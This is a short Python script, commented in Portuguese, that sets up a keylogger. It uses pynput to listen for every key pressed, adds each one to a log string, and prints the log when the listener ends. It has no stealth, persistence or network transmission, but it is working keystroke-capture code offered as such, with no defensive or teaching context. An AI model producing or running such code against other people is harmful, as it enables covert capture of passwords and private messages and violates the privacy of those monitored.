import pynput

# Classe para registrar as teclas digitadas
class Keylogger:
    def __init__(self):
        self.log = ""

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.log += current_key

# Cria uma nova instância do keylogger
keylogger = Keylogger()

# Cria um monitor de teclado
keyboard_monitor = pynput.keyboard.Listener(on_press=keylogger.process_key_press)

# Inicia o monitor de teclado
keyboard_monitor.start()

# Espera até que o keylogger seja encerrado
keyboard_monitor.join()

# Imprime o log de teclas digitadas
print(keylogger.log)
